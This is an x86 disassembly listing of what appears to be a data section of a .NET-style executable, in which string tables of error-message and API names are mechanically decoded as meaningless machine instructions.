  4086d4:	popa   
  4086d5:	fs fs pop edi
  4086d8:	push   edx
  4086d9:	gs data16 ins BYTE PTR es:[edi],dx
  4086dc:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4086e1:	outs   dx,BYTE PTR ds:[esi]
  4086e2:	dec    edi
  4086e3:	outs   dx,BYTE PTR ds:[esi]
  4086e4:	ins    BYTE PTR es:[edi],dx
  4086e5:	jns    0x408728
  4086e7:	jae    0x40875c
  4086e9:	gs ins DWORD PTR es:[edi],dx
  4086eb:	bound  ebp,QWORD PTR [ecx+edi*2+0x52]
  4086ef:	gs jae 0x408761
  4086f2:	ins    BYTE PTR es:[edi],dx
  4086f3:	jbe    0x40875a
  4086f5:	add    BYTE PTR [ecx+0x70],al
  4086f8:	jo     0x408766
  4086fa:	jns    0x40874c
  4086fc:	outs   dx,DWORD PTR ds:[esi]
  4086fd:	ins    BYTE PTR es:[edi],dx
  4086fe:	imul   esp,DWORD PTR [ebx+0x79],0x66655200
  408705:	ins    BYTE PTR es:[edi],dx
  408706:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40870b:	outs   dx,BYTE PTR ds:[esi]
  40870c:	dec    edi
  40870d:	outs   dx,BYTE PTR ds:[esi]
  40870e:	ins    BYTE PTR es:[edi],dx
  40870f:	jns    0x40875d
  408711:	outs   dx,DWORD PTR ds:[esi]
  408712:	popa   
  408713:	add    BYTE PTR fs:[ebx+0x74],dl
  408717:	jb     0x408782
  408719:	outs   dx,BYTE PTR ds:[esi]
  40871a:	addr16 inc ebx
  40871c:	outs   dx,DWORD PTR ds:[esi]
  40871d:	ins    DWORD PTR es:[edi],dx
  40871e:	jo     0x408781
  408720:	jb     0x40878b
  408722:	jae    0x408793
  408724:	outs   dx,BYTE PTR ds:[esi]
  408725:	add    BYTE PTR [ebp+eiz*2+0x62],al
  408729:	jne    0x408792
  40872b:	addr16 gs jb 0x40872f
  40872f:	inc    edx
  408730:	jb     0x408797
  408732:	popa   
  408733:	imul   eax,DWORD PTR [eax],0x67
  408736:	gs je  0x408798
  408739:	dec    esp
  40873a:	outs   dx,DWORD PTR ds:[esi]
  40873b:	arpl   WORD PTR [ecx+0x74],sp
  40873e:	imul   ebp,DWORD PTR [edi+0x6e],0x6c694600
  408745:	gs dec esi
  408747:	outs   dx,DWORD PTR ds:[esi]
  408748:	je     0x408790
  40874a:	outs   dx,DWORD PTR ds:[esi]
  40874b:	jne    0x4087bb
  40874d:	fs inc ebp
  40874f:	js     0x4087b4
  408751:	gs jo  0x4087c8
  408754:	imul   ebp,DWORD PTR [edi+0x6e],0x72614d00
  40875b:	jae    0x4087c5
  40875d:	popa   
  40875e:	ins    BYTE PTR es:[edi],dx
  40875f:	add    BYTE PTR [edi+0x65],al
  408762:	je     0x4087b8
  408764:	jns    0x4087d6
  408766:	gs dec esp
  408768:	imul   esp,DWORD PTR [edx+0x56],0x69737265
  40876f:	outs   dx,DWORD PTR ds:[esi]
  408770:	outs   dx,BYTE PTR ds:[esi]
  408771:	inc    esi
  408772:	outs   dx,DWORD PTR ds:[esi]
  408773:	jb     0x4087b6
  408775:	jae    0x4087ea
  408777:	gs ins DWORD PTR es:[edi],dx
  408779:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  40877d:	inc    edi
  40877e:	gs je  0x4087d5
  408781:	jns    0x4087f3
  408783:	gs dec esp
  408785:	imul   esp,DWORD PTR [edx+0x47],0x46646975
  40878c:	outs   dx,DWORD PTR ds:[esi]
  40878d:	jb     0x4087d0
  40878f:	jae    0x408804
  408791:	gs ins DWORD PTR es:[edi],dx
  408793:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  408797:	addr16 gs je 0x4087fa
  40879b:	push   esi
  40879c:	gs jb  0x408812
  40879f:	imul   ebp,DWORD PTR [edi+0x6e],0x74656700
  4087a6:	pop    edi
  4087a7:	dec    ebp
  4087a8:	popa   
  4087a9:	push   0x6f
  4087ab:	jb     0x4087ad
  4087ad:	addr16 gs je 0x408810
  4087b1:	dec    ebp
  4087b2:	imul   ebp,DWORD PTR [esi+0x6f],0x72410072
  4087b9:	jb     0x40881c
  4087bb:	jns    0x408809
  4087bd:	imul   esi,DWORD PTR [ebx+0x74],0x6c694600
  4087c4:	gs push ebx
  4087c6:	je     0x40883a
  4087c8:	gs popa 
  4087ca:	ins    DWORD PTR es:[edi],dx
  4087cb:	add    BYTE PTR [esi+0x69],al
  4087ce:	ins    BYTE PTR es:[edi],dx
  4087cf:	gs dec ebp
  4087d1:	outs   dx,DWORD PTR ds:[esi]
  4087d2:	fs add BYTE PTR gs:[esi+0x69],al
  4087d7:	ins    BYTE PTR es:[edi],dx
  4087d8:	gs inc ecx
  4087da:	arpl   WORD PTR [ebx+0x65],sp
  4087dd:	jae    0x408852
  4087df:	add    BYTE PTR [ebx+0x74],dl
  4087e2:	jb     0x408849
  4087e4:	popa   
  4087e5:	ins    DWORD PTR es:[edi],dx
  4087e6:	push   edx
  4087e7:	gs popa 
  4087e9:	fs gs jb 0x4087ed
  4087ed:	push   ebx
  4087ee:	je     0x408862
  4087f0:	gs popa 
  4087f2:	ins    DWORD PTR es:[edi],dx
  4087f3:	add    BYTE PTR [edi+0x65],ah
  4087f6:	je     0x408857
  4087f8:	inc    edx
  4087f9:	popa   
  4087fa:	jae    0x408861
  4087fc:	push   ebx
  4087fd:	je     0x408871
  4087ff:	gs popa 
  408801:	ins    DWORD PTR es:[edi],dx
  408802:	add    BYTE PTR [ebx+0x65],dl
  408805:	imul   ecx,DWORD PTR gs:[edi+0x72],0x69
  40880a:	imul   ebp,DWORD PTR [bp+0x0],0x6b656553
  408812:	add    BYTE PTR [ecx+0x6e],cl
  408815:	fs gs js 0x408868
  408819:	data16 add BYTE PTR [edx+esi*2+0x69],dl
  40881e:	ins    DWORD PTR es:[edi],dx
  40881f:	add    BYTE PTR [ebp+eiz*2+0x78],dl
  408823:	je     0x408877
  408825:	gs popa 
  408827:	fs gs jb 0x40882b
  40882b:	push   edx
  40882c:	gs popa 
  40882e:	fs dec esp
  408830:	imul   ebp,DWORD PTR [esi+0x65],0x6f6c4300
  408837:	jae    0x40889e
  408839:	add    BYTE PTR [edi+0x65],ah
  40883c:	je     0x40889d
  40883e:	inc    ebx
  40883f:	outs   dx,DWORD PTR ds:[esi]
  408840:	jne    0x4088b0
  408842:	je     0x408844
  408844:	push   esp
  408845:	outs   dx,DWORD PTR ds:[esi]
  408846:	inc    ecx
  408847:	jb     0x4088bb
  408849:	popa   
  40884a:	jns    0x40884c
  40884c:	push   esp
  40884d:	gs js  0x4088c4
  408850:	push   edi
  408851:	jb     0x4088bc
  408853:	je     0x4088ba
  408855:	jb     0x408857
  408857:	addr16 gs je 0x4088ba
  40885b:	inc    ebp
  40885c:	jb     0x4088d0
  40885e:	outs   dx,DWORD PTR ds:[esi]
  40885f:	jb     0x408861
  408861:	push   edi
  408862:	jb     0x4088cd
  408864:	je     0x4088cb
  408866:	dec    esp
  408867:	imul   ebp,DWORD PTR [esi+0x65],0x626c5400
  40886e:	inc    ebp
  40886f:	js     0x4088e1
  408871:	cs jb  0x4088d9
  408874:	jae    0x4088e5
  408876:	jne    0x4088ea
  408878:	arpl   WORD PTR [ebp+0x73],sp
  40887b:	add    BYTE PTR [eax],al
  40887d:	or     eax,0x6c0054
  408882:	bound  eax,QWORD PTR [eax]
  408884:	inc    ebp
  408885:	add    BYTE PTR [eax+0x0],bh
  408888:	jo     0x40888a
  40888a:	add    BYTE PTR [ecx],bh
  40888c:	inc    esi
  40888d:	add    BYTE PTR [ecx+0x0],al
  408890:	push   esp
  408891:	add    BYTE PTR [ecx+0x0],al
  408894:	dec    esp
  408895:	add    BYTE PTR [edx],bh
  408897:	add    BYTE PTR [eax],ah
  408899:	add    BYTE PTR [edx+0x0],dl
  40889c:	add    BYTE PTR gs:[ebx+0x0],dh
  4088a0:	outs   dx,DWORD PTR ds:[esi]
  4088a1:	add    BYTE PTR [ebp+0x0],dh
  4088a4:	jb     0x4088a6
  4088a6:	arpl   WORD PTR [eax],ax
  4088a8:	add    BYTE PTR gs:[eax],ah
  4088ab:	add    BYTE PTR [ebx+0x0],dh
  4088ae:	je     0x4088b0
  4088b0:	jb     0x4088b2
  4088b2:	imul   eax,DWORD PTR [eax],0x67006e
  4088b8:	and    BYTE PTR [eax],al
  4088ba:	data16 add BYTE PTR [edi+0x0],ch
  4088be:	jb     0x4088c0
  4088c0:	and    BYTE PTR [eax],al
  4088c2:	daa    
  4088c3:	add    BYTE PTR [ecx],al
  4088c5:	adc    esp,DWORD PTR [edi]
  4088c7:	add    BYTE PTR [eax],ah
  4088c9:	add    BYTE PTR [ecx+0x0],ch
  4088cc:	jae    0x4088ce
  4088ce:	and    BYTE PTR [eax],al
  4088d0:	outs   dx,BYTE PTR ds:[esi]
  4088d1:	add    BYTE PTR [ebp+0x0],dh
  4088d4:	ins    BYTE PTR es:[edi],dx
  4088d5:	add    BYTE PTR [eax+eax*1+0x1],ch
  4088d9:	cmp    eax,DWORD PTR [ebp+0x0]
  4088dc:	jb     0x4088de
  4088de:	jb     0x4088e0
  4088e0:	pop    edi
  4088e1:	add    BYTE PTR [edi+0x0],cl
  4088e4:	jne    0x4088e6
  4088e6:	je     0x4088e8
  4088e8:	jo     0x4088ea
  4088ea:	jne    0x4088ec
  4088ec:	je     0x4088ee
  4088ee:	push   edi
  4088ef:	add    BYTE PTR [edi+0x0],ch
  4088f2:	jne    0x4088f4
  4088f4:	ins    BYTE PTR es:[edi],dx
  4088f5:	add    BYTE PTR [eax+eax*1+0x4f],ah
  4088f9:	add    BYTE PTR [esi+0x0],dh
  4088fc:	add    BYTE PTR gs:[edx+0x0],dh
  408900:	ja     0x408902
  408902:	jb     0x408904
  408904:	imul   eax,DWORD PTR [eax],0x650074
  40890a:	dec    ecx
  40890b:	add    BYTE PTR [esi+0x0],ch
  40890e:	jo     0x408910
  408910:	jne    0x408912
  408912:	je     0x408914
  408914:	add    BYTE PTR [ebx],dh
  408916:	inc    ebp
  408917:	add    BYTE PTR [edx+0x0],dh
  40891a:	jb     0x40891c
  40891c:	pop    edi
  40891d:	add    BYTE PTR [ebx+0x0],al
  408920:	popa   
  408921:	add    BYTE PTR [esi+0x0],ch
  408924:	outs   dx,BYTE PTR ds:[esi]
  408925:	add    BYTE PTR [edi+0x0],ch
  408928:	je     0x40892a
  40892a:	inc    ebx
  40892b:	add    BYTE PTR [edx+0x0],dh
  40892e:	add    BYTE PTR gs:[ecx+0x0],ah
  408932:	je     0x408934
  408934:	add    BYTE PTR gs:[ecx+0x0],al
  408938:	jo     0x40893a
  40893a:	jo     0x40893c
  40893c:	inc    esp
  40893d:	add    BYTE PTR [edi+0x0],ch
  408940:	ins    DWORD PTR es:[edi],dx
  408941:	add    BYTE PTR [ecx+0x0],ah
  408944:	imul   eax,DWORD PTR [eax],0x2f00006e
  40894a:	push   esp
  40894b:	add    BYTE PTR [eax+eax*1+0x62],ch
  40894f:	add    BYTE PTR [ebp+0x0],al
  408952:	js     0x408954
  408954:	jo     0x408956
  408956:	inc    ebx
  408957:	add    BYTE PTR [edi+0x0],ch
  40895a:	add    BYTE PTR fs:[ebp+0x0],ah
  40895e:	add    BYTE PTR cs:[edx+0x0],dl
  408962:	add    BYTE PTR gs:[ebp+0x0],ch
  408966:	outs   dx,DWORD PTR ds:[esi]
  408967:	add    BYTE PTR [eax+eax*1+0x65],dh
  40896b:	add    BYTE PTR [eax+eax*1+0x6c],dl
  40896f:	add    BYTE PTR [edx+0x0],ah
  408972:	inc    ebp
  408973:	add    BYTE PTR [eax+0x0],bh
  408976:	jo     0x408978
  408978:	add    BYTE PTR [ecx],bh
  40897a:	inc    ebp
  40897b:	add    BYTE PTR [edx+0x0],dh
  40897e:	jb     0x408980
  408980:	pop    edi
  408981:	add    BYTE PTR [ebx+0x0],al
  408984:	popa   
  408985:	add    BYTE PTR [esi+0x0],ch
  408988:	outs   dx,BYTE PTR ds:[esi]
  408989:	add    BYTE PTR [edi+0x0],ch
  40898c:	je     0x40898e
  40898e:	inc    ebx
  40898f:	add    BYTE PTR [edx+0x0],dh
  408992:	add    BYTE PTR gs:[ecx+0x0],ah
  408996:	je     0x408998
  408998:	add    BYTE PTR gs:[edx+0x0],dl
  40899c:	add    BYTE PTR gs:[ebp+0x0],ch
  4089a0:	outs   dx,DWORD PTR ds:[esi]
  4089a1:	add    BYTE PTR [eax+eax*1+0x65],dh
  4089a5:	add    BYTE PTR [eax+eax*1+0x6c],dl
  4089a9:	add    BYTE PTR [edx+0x0],ah
  4089ac:	inc    ebp
  4089ad:	add    BYTE PTR [eax+0x0],bh
  4089b0:	jo     0x4089b2
  4089b2:	add    BYTE PTR [ebx],cl
  4089b4:	add    BYTE PTR gs:[esi+0x0],ch
  4089b8:	sub    eax,0x53005500
  4089bd:	add    BYTE PTR [ecx],al
  4089bf:	sub    eax,DWORD PTR [ebp+0x0]
  4089c2:	jb     0x4089c4
  4089c4:	jb     0x4089c6
  4089c6:	pop    edi
  4089c7:	add    BYTE PTR [ecx+0x0],cl
  4089ca:	outs   dx,BYTE PTR ds:[esi]
  4089cb:	add    BYTE PTR [eax+0x0],dh
  4089ce:	jne    0x4089d0
  4089d0:	je     0x4089d2
  4089d2:	inc    esi
  4089d3:	add    BYTE PTR [ecx+0x0],ch
  4089d6:	ins    BYTE PTR es:[edi],dx
  4089d7:	add    BYTE PTR [ebp+0x0],ah
  4089da:	dec    esi
  4089db:	add    BYTE PTR [edi+0x0],ch
  4089de:	je     0x4089e0
  4089e0:	inc    esi
  4089e1:	add    BYTE PTR [edi+0x0],ch
  4089e4:	jne    0x4089e6
  4089e6:	outs   dx,BYTE PTR ds:[esi]
  4089e7:	add    BYTE PTR [eax+eax*1+0x0],ah
  4089eb:	and    DWORD PTR [ebp+0x0],ecx
  4089ee:	jae    0x4089f0
  4089f0:	add    BYTE PTR [bx+0x0],bl
  4089f4:	push   edx
  4089f5:	add    BYTE PTR [ebp+0x0],ah
  4089f8:	jae    0x4089fa
  4089fa:	outs   dx,DWORD PTR ds:[esi]
  4089fb:	add    BYTE PTR [eax+eax*1+0x76],ch
  4089ff:	add    BYTE PTR [ebp+0x0],ah
  408a02:	add    BYTE PTR fs:[esi+0x0],al
  408a06:	imul   eax,DWORD PTR [eax],0x65006c
  408a0c:	add    BYTE PTR [ecx],cl
  408a0e:	sub    al,BYTE PTR [eax]
  408a10:	outs   dx,DWORD PTR ds:[esi]
  408a11:	add    BYTE PTR [ebp+0x0],dh
  408a14:	je     0x408a16
  408a16:	add    BYTE PTR [ebx],bl
  408a18:	sub    al,BYTE PTR [eax]
  408a1a:	je     0x408a1c
  408a1c:	ins    BYTE PTR es:[edi],dx
  408a1d:	add    BYTE PTR [edx+0x0],ah
  408a20:	jb     0x408a22
  408a22:	add    BYTE PTR gs:[esi+0x0],ah
  408a26:	add    BYTE PTR gs:[edx+0x0],dh
  408a2a:	add    BYTE PTR gs:[esi+0x0],ch
  408a2e:	arpl   WORD PTR [eax],ax
  408a30:	add    BYTE PTR gs:[eax],al
  408a33:	pop    ss
  408a34:	sub    al,BYTE PTR [eax]
  408a36:	je     0x408a38
  408a38:	ins    BYTE PTR es:[edi],dx
  408a39:	add    BYTE PTR [edx+0x0],ah
  408a3c:	jb     0x408a3e
  408a3e:	add    BYTE PTR gs:[esi+0x0],ah
  408a42:	jo     0x408a44
  408a44:	popa   
  408a45:	add    BYTE PTR [eax+eax*1+0x68],dh
  408a49:	add    BYTE PTR [eax],al
  408a4b:	adc    DWORD PTR [edx],ebp
  408a4d:	add    BYTE PTR [ecx+0x0],ah
  408a50:	jae    0x408a52
  408a52:	ins    DWORD PTR es:[edi],dx
  408a53:	add    BYTE PTR [eax+0x0],dh
  408a56:	popa   
  408a57:	add    BYTE PTR [eax+eax*1+0x68],dh
  408a5b:	add    BYTE PTR [eax],al
  408a5d:	or     esi,DWORD PTR [edi+0x0]
  408a60:	imul   eax,DWORD PTR [eax],0x36006e
  408a66:	xor    al,0x0
  408a68:	add    BYTE PTR [ebx],cl
  408a6a:	ja     0x408a6c
  408a6c:	imul   eax,DWORD PTR [eax],0x33006e
  408a72:	xor    al,BYTE PTR [eax]
  408a74:	add    BYTE PTR [ecx],dl
  408a76:	outs   dx,DWORD PTR ds:[esi]
  408a77:	add    BYTE PTR [eax+eax*1+0x64],ch
  408a7b:	add    BYTE PTR [esi+0x0],ch
  408a7e:	popa   
  408a7f:	add    BYTE PTR [ebp+0x0],ch
  408a82:	add    BYTE PTR gs:[ebx+0x0],dh
  408a86:	add    BYTE PTR ds:0x6f006e,cl
  408a8c:	ins    BYTE PTR es:[edi],dx
  408a8d:	add    BYTE PTR [edi+0x0],ch
  408a90:	add    BYTE PTR [bx+0x0],ch
  408a94:	add    BYTE PTR ds:0x690073,cl
  408a9a:	ins    BYTE PTR es:[edi],dx
  408a9b:	add    BYTE PTR [ebp+0x0],ah
  408a9e:	outs   dx,BYTE PTR ds:[esi]
  408a9f:	add    BYTE PTR [eax+eax*1+0x0],dh
  408aa3:	pcmpeqd mm0,QWORD PTR [eax]
  408aa6:	add    BYTE PTR gs:[edx+0x0],dh
  408aaa:	bound  eax,QWORD PTR [eax]
  408aac:	outs   dx,DWORD PTR ds:[esi]
  408aad:	add    BYTE PTR [ebx+0x0],dh
  408ab0:	add    BYTE PTR gs:[eax],al
  408ab3:	or     eax,0x6e002a
  408ab8:	popa   
  408ab9:	add    BYTE PTR [ebp+0x0],ch
  408abc:	add    BYTE PTR gs:[ebx+0x0],dh
  408ac0:	add    BYTE PTR [ebx],al
  408ac2:	aas    
  408ac3:	add    BYTE PTR [eax],al
  408ac5:	or     DWORD PTR [eax+0x0],ebp
  408ac8:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  408acd:	add    BYTE PTR [eax],al
  408acf:	pop    es
  408ad0:	outs   dx,DWORD PTR ds:[esi]
  408ad1:	add    BYTE PTR [ebp+0x0],dh
  408ad4:	je     0x408ad6
  408ad6:	add    BYTE PTR [ebx],cl
  408ad8:	outs   dx,BYTE PTR ds:[esi]
  408ad9:	add    BYTE PTR [ecx+0x0],ah
  408adc:	ins    DWORD PTR es:[edi],dx
  408add:	add    BYTE PTR [ebp+0x0],ah
  408ae0:	jae    0x408ae2
  408ae2:	add    BYTE PTR [edi],cl
  408ae4:	popa   
  408ae5:	add    BYTE PTR [ebx+0x0],dh
  408ae8:	ins    DWORD PTR es:[edi],dx
  408ae9:	add    BYTE PTR [eax+0x0],dh
  408aec:	popa   
  408aed:	add    BYTE PTR [eax+eax*1+0x68],dh
  408af1:	add    BYTE PTR [eax],al
  408af3:	add    edi,DWORD PTR [ebx]
  408af5:	add    BYTE PTR [eax],al
  408af7:	sbb    DWORD PTR [eax+eax*1+0x6c],esi
  408afb:	add    BYTE PTR [edx+0x0],ah
  408afe:	jb     0x408b00
  408b00:	add    BYTE PTR gs:[esi+0x0],ah
  408b04:	add    BYTE PTR gs:[edx+0x0],dh
  408b08:	add    BYTE PTR gs:[esi+0x0],ch
  408b0c:	arpl   WORD PTR [eax],ax
  408b0e:	add    BYTE PTR gs:[eax],al
  408b11:	adc    eax,0x6c0074
  408b16:	bound  eax,QWORD PTR [eax]
  408b18:	jb     0x408b1a
  408b1a:	add    BYTE PTR gs:[esi+0x0],ah
  408b1e:	jo     0x408b20
  408b20:	popa   
  408b21:	add    BYTE PTR [eax+eax*1+0x68],dh
  408b25:	add    BYTE PTR [eax],al
  408b27:	and    eax,DWORD PTR [ebp+0x0]
  408b2a:	jb     0x408b2c
  408b2c:	jb     0x408b2e
  408b2e:	pop    edi
  408b2f:	add    BYTE PTR [ecx+0x0],cl
  408b32:	outs   dx,BYTE PTR ds:[esi]
  408b33:	add    BYTE PTR [esi+0x0],dh
  408b36:	popa   
  408b37:	add    BYTE PTR [eax+eax*1+0x69],ch
  408b3b:	add    BYTE PTR [eax+eax*1+0x4f],ah
  408b3f:	add    BYTE PTR [eax+0x0],dh
  408b42:	je     0x408b44
  408b44:	imul   eax,DWORD PTR [eax],0x6e006f
  408b4a:	add    BYTE PTR [edi],bl
  408b4c:	inc    ebp
  408b4d:	add    BYTE PTR [edx+0x0],dh
  408b50:	jb     0x408b52
  408b52:	pop    edi
  408b53:	add    BYTE PTR [esi+0x0],cl
  408b56:	outs   dx,DWORD PTR ds:[esi]
  408b57:	add    BYTE PTR [ecx+0x0],cl
  408b5a:	outs   dx,BYTE PTR ds:[esi]
  408b5b:	add    BYTE PTR [eax+0x0],dh
  408b5e:	jne    0x408b60
  408b60:	je     0x408b62
  408b62:	inc    esi
  408b63:	add    BYTE PTR [ecx+0x0],ch
  408b66:	ins    BYTE PTR es:[edi],dx
  408b67:	add    BYTE PTR [ebp+0x0],ah
  408b6a:	add    BYTE PTR [edi],ah
  408b6c:	inc    ebp
  408b6d:	add    BYTE PTR [edx+0x0],dh
  408b70:	jb     0x408b72
  408b72:	pop    edi
  408b73:	add    BYTE PTR [edi+0x0],cl
  408b76:	outs   dx,BYTE PTR ds:[esi]
  408b77:	add    BYTE PTR [eax+eax*1+0x79],ch
  408b7b:	add    BYTE PTR [edi+0x0],cl
  408b7e:	outs   dx,BYTE PTR ds:[esi]
  408b7f:	add    BYTE PTR [ebp+0x0],ah
  408b82:	push   eax
  408b83:	add    BYTE PTR [eax+eax*1+0x61],ch
  408b87:	add    BYTE PTR [eax+eax*1+0x66],dh
  408b8b:	add    BYTE PTR [edi+0x0],ch
  408b8e:	jb     0x408b90
  408b90:	ins    DWORD PTR es:[edi],dx
  408b91:	add    BYTE PTR [eax],al
  408b93:	sbb    ecx,DWORD PTR [ebp+0x0]
  408b96:	jae    0x408b98
  408b98:	add    BYTE PTR [bx+0x0],bl
  408b9c:	inc    ebx
  408b9d:	add    BYTE PTR [edi+0x0],ch
  408ba0:	jo     0x408ba2
  408ba2:	jns    0x408ba4
  408ba4:	jb     0x408ba6
  408ba6:	imul   eax,DWORD PTR [eax],0x680067
  408bac:	je     0x408bae
  408bae:	add    BYTE PTR [edi],dl
  408bb0:	xor    eax,DWORD PTR [eax]
  408bb2:	add    BYTE PTR cs:0x33002e00,dh
  408bb9:	add    BYTE PTR [eax],dh
  408bbb:	add    BYTE PTR [edi],dh
  408bbd:	add    BYTE PTR [edx],dh
  408bbf:	add    BYTE PTR [ecx],bh
  408bc1:	add    BYTE PTR [esi],ch
  408bc3:	add    BYTE PTR [ecx],dh
  408bc5:	add    BYTE PTR [eax],al
  408bc7:	adc    eax,0x73004d
  408bcc:	add    BYTE PTR [bx+0x0],bl
  408bd0:	push   ebp
  408bd1:	add    BYTE PTR [ebx+0x0],dh
  408bd4:	popa   
  408bd5:	add    BYTE PTR [edi+0x0],ah
  408bd8:	add    BYTE PTR gs:[edi+0x0],bl
  408bdc:	add    BYTE PTR [ecx],cl
  408bde:	je     0x408be0
  408be0:	add    BYTE PTR gs:[ebp+0x0],ch
  408be4:	jo     0x408be6
  408be6:	add    BYTE PTR [ebx],al
  408be8:	xor    BYTE PTR [eax],al
  408bea:	add    BYTE PTR [ebx],al
  408bec:	sub    al,BYTE PTR [eax]
  408bee:	add    BYTE PTR [ebx],al
  408bf0:	sub    eax,DWORD PTR [eax]
  408bf2:	add    BYTE PTR ds:0x720045,ah
  408bf8:	jb     0x408bfa
  408bfa:	pop    edi
  408bfb:	add    BYTE PTR [ecx+0x0],al
  408bfe:	ins    DWORD PTR es:[edi],dx
  408bff:	add    BYTE PTR [edx+0x0],ah
  408c02:	imul   eax,DWORD PTR [eax],0x6f0067
  408c08:	jne    0x408c0a
  408c0a:	jae    0x408c0c
  408c0c:	dec    edi
  408c0d:	add    BYTE PTR [eax+0x0],dh
  408c10:	je     0x408c12
  408c12:	imul   eax,DWORD PTR [eax],0x6e006f
  408c18:	add    BYTE PTR [ebx],ah
  408c1a:	inc    ebp
  408c1b:	add    BYTE PTR [edx+0x0],dh
  408c1e:	jb     0x408c20
  408c20:	pop    edi
  408c21:	add    BYTE PTR [ebp+0x0],dl
  408c24:	outs   dx,BYTE PTR ds:[esi]
  408c25:	add    BYTE PTR [ebx+0x0],ch
  408c28:	outs   dx,BYTE PTR ds:[esi]
  408c29:	add    BYTE PTR [edi+0x0],ch
  408c2c:	ja     0x408c2e
  408c2e:	outs   dx,BYTE PTR ds:[esi]
  408c2f:	add    BYTE PTR [edi+0x0],cl
  408c32:	jo     0x408c34
  408c34:	je     0x408c36
  408c36:	imul   eax,DWORD PTR [eax],0x6e006f
  408c3c:	add    BYTE PTR [ebx],al
  408c3e:	das    
  408c3f:	add    BYTE PTR [eax],al
  408c41:	add    ebp,DWORD PTR ds:0x45270100
  408c47:	add    BYTE PTR [edx+0x0],dh
  408c4a:	jb     0x408c4c
  408c4c:	pop    edi
  408c4d:	add    BYTE PTR [esi+0x0],cl
  408c50:	outs   dx,DWORD PTR ds:[esi]
  408c51:	add    BYTE PTR [esi+0x0],dl
  408c54:	popa   
  408c55:	add    BYTE PTR [eax+eax*1+0x75],ch
  408c59:	add    BYTE PTR [ebp+0x0],ah
  408c5c:	push   edx
  408c5d:	add    BYTE PTR [ebp+0x0],ah
  408c60:	jno    0x408c62
  408c62:	jne    0x408c64
  408c64:	imul   eax,DWORD PTR [eax],0x650072
  408c6a:	add    BYTE PTR fs:[eax],al
  408c6d:	and    eax,DWORD PTR [ebp+0x0]
  408c70:	jb     0x408c72
  408c72:	jb     0x408c74
  408c74:	pop    edi
  408c75:	add    BYTE PTR [esi+0x0],dl
  408c78:	popa   
  408c79:	add    BYTE PTR [eax+eax*1+0x75],ch
  408c7d:	add    BYTE PTR [ebp+0x0],ah
  408c80:	push   edx
  408c81:	add    BYTE PTR [ebp+0x0],ah
  408c84:	jno    0x408c86
  408c86:	jne    0x408c88
  408c88:	imul   eax,DWORD PTR [eax],0x650072
  408c8e:	add    BYTE PTR fs:[eax],al
  408c91:	sub    eax,0x720057
  408c96:	outs   dx,BYTE PTR ds:[esi]
  408c97:	add    BYTE PTR [edi+0x0],bl
  408c9a:	inc    ebx
  408c9b:	add    BYTE PTR [edx+0x0],dh
  408c9e:	outs   dx,DWORD PTR ds:[esi]
  408c9f:	add    BYTE PTR [ebx+0x0],dh
  408ca2:	jae    0x408ca4
  408ca4:	inc    ebx
  408ca5:	add    BYTE PTR [edi+0x0],ch
  408ca8:	ins    DWORD PTR es:[edi],dx
  408ca9:	add    BYTE PTR [eax+0x0],dh
  408cac:	imul   eax,DWORD PTR [eax],0x65006c
  408cb2:	dec    esi
  408cb3:	add    BYTE PTR [edi+0x0],ch
  408cb6:	push   edx
  408cb7:	add    BYTE PTR [ebp+0x0],ah
  408cba:	data16 add BYTE PTR [ebx+0x0],dh
  408cbe:	add    BYTE PTR [ecx],ch
  408cc0:	push   edi
  408cc1:	add    BYTE PTR [edx+0x0],dh
  408cc4:	outs   dx,BYTE PTR ds:[esi]
  408cc5:	add    BYTE PTR [edi+0x0],bl
  408cc8:	push   eax
  408cc9:	add    BYTE PTR [ebp+0x0],dh
  408ccc:	jb     0x408cce
  408cce:	add    BYTE PTR gs:[ebx+0x0],al
  408cd2:	jb     0x408cd4
  408cd4:	outs   dx,DWORD PTR ds:[esi]
  408cd5:	add    BYTE PTR [ebx+0x0],dh
  408cd8:	jae    0x408cda
  408cda:	inc    ebx
  408cdb:	add    BYTE PTR [edi+0x0],ch
  408cde:	ins    DWORD PTR es:[edi],dx
  408cdf:	add    BYTE PTR [eax+0x0],dh
  408ce2:	imul   eax,DWORD PTR [eax],0x65006c
  408ce8:	add    BYTE PTR [ecx],cl
  408cea:	add    BYTE PTR cs:[eax+eax*1+0x6c],dh
  408cef:	add    BYTE PTR [edx+0x0],ah
  408cf2:	add    BYTE PTR ds:0x720057,dh
  408cf8:	outs   dx,BYTE PTR ds:[esi]
  408cf9:	add    BYTE PTR [edi+0x0],bl
  408cfc:	inc    ecx
  408cfd:	add    BYTE PTR [ebx+0x0],dh
  408d00:	jae    0x408d02
  408d02:	add    BYTE PTR gs:[ebp+0x0],ch
  408d06:	bound  eax,QWORD PTR [eax]
  408d08:	ins    BYTE PTR es:[edi],dx
  408d09:	add    BYTE PTR [ecx+0x0],bh
  408d0c:	dec    eax
  408d0d:	add    BYTE PTR [ecx+0x0],ah
  408d10:	jae    0x408d12
  408d12:	inc    ebp
  408d13:	add    BYTE PTR [ebp+0x0],ch
  408d16:	bound  eax,QWORD PTR [eax]
  408d18:	add    BYTE PTR gs:[eax+eax*1+0x64],ah
  408d1d:	add    BYTE PTR [ebp+0x0],ah
  408d20:	add    BYTE PTR fs:[eax+eax*1+0x6c],dl
  408d25:	add    BYTE PTR [edx+0x0],ah
  408d28:	add    BYTE PTR [ecx],ch
  408d2a:	dec    ebp
  408d2b:	add    BYTE PTR [ebx+0x0],dh
  408d2e:	add    BYTE PTR [bx+0x0],bl
  408d32:	inc    ecx
  408d33:	add    BYTE PTR [ebx+0x0],dh
  408d36:	jae    0x408d38
  408d38:	add    BYTE PTR gs:[ebp+0x0],ch
  408d3c:	bound  eax,QWORD PTR [eax]
  408d3e:	ins    BYTE PTR es:[edi],dx
  408d3f:	add    BYTE PTR [ecx+0x0],bh
  408d42:	inc    ebp
  408d43:	add    BYTE PTR [eax+0x0],bh
  408d46:	jo     0x408d48
  408d48:	outs   dx,DWORD PTR ds:[esi]
  408d49:	add    BYTE PTR [edx+0x0],dh
  408d4c:	je     0x408d4e
  408d4e:	add    BYTE PTR gs:[eax+eax*1+0x0],ah
  408d53:	sub    eax,0x720045
  408d58:	jb     0x408d5a
  408d5a:	pop    edi
  408d5b:	add    BYTE PTR [ebp+0x0],al
  408d5e:	jb     0x408d60
  408d60:	jb     0x408d62
